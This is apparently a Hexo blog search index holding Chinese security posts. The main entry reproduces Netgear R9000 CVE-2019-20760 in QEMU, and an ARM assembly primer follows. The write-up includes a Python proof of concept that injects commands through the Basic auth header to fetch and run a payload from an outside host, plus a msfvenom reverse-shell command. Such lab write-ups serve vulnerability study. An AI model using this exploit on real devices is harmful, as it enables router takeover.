<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AI安全研习</title>
    <url>/2023/10/30/AI%E5%AE%89%E5%85%A8%E7%A0%94%E4%B9%A0/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Netgear-CVE-2019-20760</title>
    <url>/2023/10/05/Netgear-CVE-2019-20760/</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
<li><strong>漏洞服务：</strong> <code>uhttpd</code></li>
<li><strong>漏洞类型：</strong> 远程命令执行</li>
<li><strong>影响范围：</strong> 1.0.4.26之前的NETGEAR R9000设备会受到身份验证绕过的影响</li>
<li><strong>解决建议：</strong> 更新版本</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
<li><strong>操作环境：</strong> ubuntu:22.04</li>
<li><strong>qemu-version：</strong> 8.1.1</li>
</ul>
<h3 id="仿真环境"><a href="#仿真环境" class="headerlink" title="仿真环境"></a>仿真环境</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.26.zip</span><br></pre></td></tr></table></figure></div>

<p>下载固件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -Mer R9000-V1.0.4.26.img </span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006204853421.png"
                      alt="image-20231006204853421"
                ></p>
<p>可通过 <code>binwalk</code> 常规解压获得文件系统。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006213813263.png"
                      alt="image-20231006213813263"
                ></p>
<p>检查 <code>ELF32</code> 文件架构为 <code>arm-32-little</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://file.erlkonig.tech/debian-armhf/wheezy/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure></div>

<p>下载合适的虚拟机映像。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参考《CTF实战》by ChaMd5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&#x27;ens33&#x27;</span>: The NIC is that can connect internet</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33               # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up   # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006215529022.png"
                      alt="image-20231006215529022"
                ></p>
<p>配置网络。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-M              			# 选择开发板​</span><br><span class="line">-m							# 指定内存大小</span><br><span class="line">-drive         			    # 定义存储驱动器​</span><br><span class="line">file=         			    # 定义镜像文件​</span><br><span class="line">-net nic       			    # 创建客户机网卡​</span><br><span class="line">-net tap                    # 创建 tap 设备，以桥接方式跟宿主机通信​</span><br><span class="line">ifname=virtual0             # tap 设备与名为 virtual0 的虚拟网卡进行桥接通信​</span><br><span class="line">-nographic                  # 以非图形化模式启动​</span><br><span class="line">-append        			    # 内核启动附加参数​</span><br><span class="line">-console=ttyAMA0		    # console指向串口，有此启动参数，内核启动日志才能输出到宿主机终端</span><br><span class="line">-nographic					# 不再启用额外的终端界面</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220307746.png"
                      alt="image-20231006220307746"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220609818.png"
                      alt="image-20231006220609818"
                ></p>
<p>启动 <code>qemu-system-armhf</code> 环境，默认用户名密码都为 <code>root</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.152.168/24</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220912835.png"
                      alt="image-20231006220912835"
                ></p>
<p>为 <code>qemu-system-armhf</code> 配置静态 <code>IP</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tar -cvf squashfs-root.tar.gz squashfs-root/</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221335309.png"
                      alt="image-20231006221335309"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221428854.png"
                      alt="image-20231006221428854"
                ></p>
<p>将文件根系统打包，然后利用 <code>python3</code> 的 <code>http.server</code> 模块下载到 <code>qemu-system-armhf</code>  的根目录中并用 <code>tar xvf squashfs-root.tar.gz </code> 解压。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /squashfs-root</span><br><span class="line">mount --bind /proc proc # proc目录是一个虚拟文件系统，可以为linux用户空间和内核空间提供交互</span><br><span class="line">mount --bind /dev dev   # /dev/下的设备是通过创建设备节点生成的，用户通过此设备节点来访问内核里的驱动</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006222713410.png"
                      alt="image-20231006222713410"
                ></p>
<p>因为 <code>chroot</code> 会导致无法在隔离的文件系统中访问原本的 <code>/proc</code>和  <code>/dev</code> 目录，这里利用 <code>mount</code> 命令将 <code>qemu-system-armhf</code>  的 <code>proc</code> 和 <code>dev</code> 目录挂在到 <code>squashfs-root</code> 中，并更换根目录为 <code>squashfs-root</code>。</p>
<h3 id="Web模拟"><a href="#Web模拟" class="headerlink" title="Web模拟"></a>Web模拟</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">find -name uhttpd</span><br><span class="line">cat ./etc/init.d/uhttpd</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./etc/init.d/uhttpd</span></span><br><span class="line">...</span><br><span class="line">start() &#123;</span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_load uhttpd</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_foreach start_instance uhttpd</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">mkdir</span> /tmp/www</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">cp</span> -rf /usr/www/* /tmp/www</span></span><br><span class="line"></span><br><span class="line">	/www/cgi-bin/uhttpd.sh start</span><br><span class="line">	inetd</span><br><span class="line">	detplc</span><br><span class="line">    #for bug58012</span><br><span class="line">    touch /tmp/fwcheck_status</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>查找 <code>uhttpd</code> 的相关文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">REALM=`/bin/cat /module_name | sed &#x27;s/\n//g&#x27;`</span><br><span class="line">UHTTPD_BIN=&quot;/usr/sbin/uhttpd&quot;</span><br><span class="line">PX5G_BIN=&quot;/usr/sbin/px5g&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uhttpd_stop()</span><br><span class="line">&#123;</span><br><span class="line">	kill -9 $(pidof uhttpd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uhttpd_start()</span><br><span class="line">&#123;</span><br><span class="line">        $UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">	stop)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">	;;</span><br><span class="line">	start)</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	restart)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	*)</span><br><span class="line">		logger -- &quot;usage: $0 start|stop|restart&quot;</span><br><span class="line">	;;</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006223655990.png"
                      alt="image-20231006223655990"
                ></p>
<p>查看 <code>start()</code> 函数中利用的 <code>/www/cgi-bin/uhttpd.sh</code> 脚本。发现启动命令为 <code>$UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</code> 其中 <code>REALM = R9000</code> ，<code>UHTTPD_BIN = /usr/sbin/uhttpd</code>。我们无需开启 <code>https</code>，所以启动命令为 <code>/usr/sbin/uhttpd -h /www -r R9000 -x /cgi-bin -t 70 -p 0.0.0.0:80</code>。</p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.28.zip</span><br></pre></td></tr></table></figure></div>

<p>获取修复版本的固件。因为源码较为繁杂，我们通过 <code>Bindiff</code> 进行二进制比对，来查找漏洞点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006231411605.png"
                      alt="image-20231006231411605"
                ></p>
<p><code>shift+D</code> 选取修复版本的 <code>/usr/sbin/uhttpd</code> 文件即可，主要查看登录验证的 <code>uh_cgi_auth_check()</code> 函数。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v14 = <span class="built_in">strlen</span>(v13);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">0xFFF</span>, v13 + <span class="number">6</span>, v14 - <span class="number">6</span>);</span><br><span class="line">  v15 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_32:</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = v15 + <span class="number">1</span>;</span><br><span class="line">  *v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v15 != (<span class="type">char</span> *)<span class="number">0xFFFFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(command, <span class="number">0x80</span>u, <span class="string">&quot;/usr/sbin/hash-data -e %s &gt;/tmp/hash_result&quot;</span>, v15 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">system</span>(command);</span><br><span class="line">    v3 = <span class="built_in">cat_file</span>(<span class="number">73805</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = s</span><br></pre></td></tr></table></figure></div>

<p>漏洞版本 <code>base64</code> 解密后 <code>snprintf()</code> 后直接传给 <code>system()</code> 执行，这里会把 <code>v15(:)</code>后面的内容放到 <code>%s</code> 处，记得加<code>\n</code>来执行多条指令。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v15 = <span class="built_in">strlen</span>(v14);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">4095</span>, v14 + <span class="number">6</span>, v15 - <span class="number">6</span>);</span><br><span class="line">  v16 = <span class="built_in">strchr</span>(s, <span class="number">58</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = v16 + <span class="number">1</span>;</span><br><span class="line">  *v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != (<span class="type">char</span> *)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = s;</span><br><span class="line">    <span class="built_in">dni_system</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;/usr/sbin/hash-data&quot;</span>, <span class="string">&quot;-e&quot;</span>, v17, <span class="number">0</span>);</span><br><span class="line">    v19 = <span class="built_in">cat_file</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>而修复版本则利用 <code>dni_system()</code> 执行，只可控参数。</p>
<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><p>poc:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd  = <span class="string">&#x27;admin:&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;wget http://192.168.152.167:8000/shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 ./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">cmd_b64 = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic &quot;</span> + cmd_b64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">&quot;http://192.168.152.168/cgi-bin/&quot;</span>, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.152.167 LPORT=10086 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></div>

<p>利用 <code>msf</code> 生成对应架构的木马程序，然后在<code>shell.elf</code>所在的目录开启<code>http</code>服务，利用漏洞将木马程序下载下来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006233741185.png"
                      alt="image-20231006233741185"
                ></p>
<p>启动监听，并执行 <code>exp.py</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234357194.png"
                      alt="image-20231006234357194"
                ></p>
<p>成功获取 <code>shell</code>，我们利用获取的权限在 <code>www</code> 目录创建 <code>flag.txt</code> 文件然后访问它。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234709504.png"
                      alt="image-20231006234709504"
                ></p>
<p>成功创建。</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT-入门篇</title>
    <url>/2023/10/17/IoT-%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习 <code>IoT</code>，主要还是以路由器为主，做了些笔记，写的还算细致些，适合新手师傅入门看，水平有限，有错误的地方还请师傅不吝指正。</p>
<h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><p>本篇默认读者有<code>x86</code>汇编基础。<strong>所有架构的系统调用号可以在这里查<a class="link"   href="https://gpages.juszkiewicz.com.pl/syscalls-table/syscalls.html" >系统调用查询网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</strong></p>
<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p><a class="link"   href="https://blog.csdn.net/heshuangzong/article/details/126910902" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a class="link"   href="https://blog.csdn.net/Luckiers/article/details/128221506" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>ARM</code> 中的指令、伪指令、伪操作、寄存器名等可以全部使用大写，也可以全部使用小写，但是不能大小写混用。</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table>
<thead>
<tr>
<th>ARM</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>R0</td>
<td>General Purpose(第 1 个参数，也可被用作累加器，还被用于存储函数的返回值)</td>
</tr>
<tr>
<td>R1-R3</td>
<td>General Purpose(第 2、3、4 个参数)</td>
</tr>
<tr>
<td>R4-R6</td>
<td>General Purpose</td>
</tr>
<tr>
<td>R7</td>
<td>General Purpose(R7常用于存储系统调用号)</td>
</tr>
<tr>
<td>R8-R10</td>
<td>General Purpose</td>
</tr>
<tr>
<td>R11(FP)</td>
<td>Frame Pointer(栈帧)</td>
</tr>
<tr>
<td>R12(IP)</td>
<td>Intra Procedural Call(内部程序调用)</td>
</tr>
<tr>
<td>R13(SP)</td>
<td>Stack Pointer(栈顶)</td>
</tr>
<tr>
<td>R14(LR)</td>
<td>Link Register(链接寄存器，用来存放函数的返回地址)</td>
</tr>
<tr>
<td>R15(PC)</td>
<td>&lt;Program Counter&#x2F;Instruction Pointer&gt;</td>
</tr>
<tr>
<td>CPSR</td>
<td>程序状态寄存器，用户级编程时用于存储条件码</td>
</tr>
<tr>
<td>SPSR</td>
<td>SPSR 除usr、sys外，用于异常保护的CPSR的备份，异常时，保存CPSR值，异常退出时，将该值恢复到CPSR</td>
</tr>
</tbody></table>
<p>特别的，如果函数返回值大于4字节，则用R0-R1做返回值，R2-R3做函数参数，其余参数入栈。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>一般格式如下：</p>
<blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br><span class="line">助记符&#123;是否使用CPSR&#125;&#123;是否条件执行以及条件&#125; &#123;目的寄存器&#125;, 操作符1, 操作符2</span><br></pre></td></tr></table></figure></div>

<p>由于ARM指令的灵活性，不是全部的指令都满足这个模板，不过大部分都满足了。下面来说说模板中的含义:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MNEMONIC     - 指令的助记符如ADD</span><br><span class="line">&#123;S&#125;          - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关的FLAG</span><br><span class="line">&#123;condition&#125;  - 如果机器码要被条件执行，那它需要满足的条件标示</span><br><span class="line">&#123;Rd&#125;         - 存储结果的目的寄存器</span><br><span class="line">Operand1     - 第一个操作数，寄存器或者是一个立即数</span><br><span class="line">Operand2     - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器</span><br></pre></td></tr></table></figure></div>

<p>当助记符，S，目的寄存器以及第一个操作数都被声明的时候，条件执行以及第二操作数需要一些声明。因为条件执行是依赖于CPSR寄存器的值的，更精确的说是寄存器中的一些比特位。第二操作数是一个可变操作数，因为我们可以以各种形式来使用它，立即数，寄存器，或者有偏移量的寄存器。举例来说，第二操作数还有如下操作：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#123                    @ 立即数</span><br><span class="line">Rx                      @ 寄存器比如R1</span><br><span class="line">Rx, ASR n               @ 对寄存器中的值进行算术右移n位后的值</span><br><span class="line">Rx, LSL n               @ 对寄存器中的值进行逻辑左移n位后的值</span><br><span class="line">Rx, LSR n               @ 对寄存器中的值进行逻辑右移n位后的值</span><br><span class="line">Rx, ROR n               @ 对寄存器中的值进行循环右移n位后的值</span><br><span class="line">Rx, RRX                 @ 对寄存器中的值进行带扩展的循环右移1位后的值</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD   R0, R1, R2         @ 将第一操作数R1的内容与第二操作数R2的内容相加，将结果存储到R0中。</span><br><span class="line">ADD   R0, R1, #2         @ 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中</span><br><span class="line">MOVLE R0, #5             @ 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE 						   @ R0, R0, #5相同</span><br><span class="line">MOV   R0, R1, LSL #1     @ 将第一操作数R1寄存器中的值逻辑左移1位后存入R0</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p>指令中一些结尾符号有特殊含义，方便理解，比如：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
<th>指令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>MOV</td>
<td>移动数据</td>
<td>EOR</td>
<td>比特位异或</td>
</tr>
<tr>
<td>MVN</td>
<td>取反码移动数据</td>
<td>LDR</td>
<td>加载数据</td>
</tr>
<tr>
<td>ADD</td>
<td>数据相加</td>
<td>STR</td>
<td>存储数据</td>
</tr>
<tr>
<td>SUB</td>
<td>数据相减</td>
<td>LDM</td>
<td>多次加载</td>
</tr>
<tr>
<td>MUL</td>
<td>数据相乘</td>
<td>STM</td>
<td>多次存储</td>
</tr>
<tr>
<td>LSL</td>
<td>逻辑左移</td>
<td>PUSH</td>
<td>压栈</td>
</tr>
<tr>
<td>LSR</td>
<td>逻辑右移</td>
<td>POP</td>
<td>出栈</td>
</tr>
<tr>
<td>ASR</td>
<td>算术右移</td>
<td>B</td>
<td>分支跳转，无条件跳转</td>
</tr>
<tr>
<td>ROR</td>
<td>循环右移</td>
<td>BL</td>
<td>链接分支跳转，保存返回地址于LR</td>
</tr>
<tr>
<td>CMP</td>
<td>比较操作</td>
<td>BX</td>
<td>分支跳转切换</td>
</tr>
<tr>
<td>AND</td>
<td>比特位与</td>
<td>BLX</td>
<td>链接分支跳转切换</td>
</tr>
<tr>
<td>ORR</td>
<td>比特位或</td>
<td>SWI&#x2F;SVC</td>
<td>系统调用</td>
</tr>
<tr>
<td>MRS</td>
<td>将特殊寄存器中的数据传递给通用寄存器</td>
<td>MSR</td>
<td>将通用寄存器中的数据传递给特殊寄存器</td>
</tr>
</tbody></table>
<p><strong>重点指令示例</strong></p>
<table>
<thead>
<tr>
<th>指令</th>
<th>目的</th>
<th>源</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>MOV</td>
<td>R0</td>
<td>R1</td>
<td>将 R1 里面的数据复制到 R0 中。</td>
</tr>
<tr>
<td>MRS</td>
<td>R0</td>
<td>CPSR</td>
<td>将特殊寄存器 CPSR 里面的数据复制到 R0 中。</td>
</tr>
<tr>
<td>MSR</td>
<td>CPSR</td>
<td>R1</td>
<td>将 R1 里面的数据复制到特殊寄存器 CPSR 里中。</td>
</tr>
<tr>
<td>LDR</td>
<td>R0</td>
<td>&#x3D;0X0209C004</td>
<td>将寄存器地址 0X0209C004 加载到 R0 中，即 R0&#x3D;0X0209C004</td>
</tr>
<tr>
<td>STR</td>
<td>R1</td>
<td>[R0]</td>
<td>将 R1 中的值写入到 R0 中所保存的地址中</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>指令</th>
<th>操作数</th>
<th>描述</th>
</tr>
</thead>
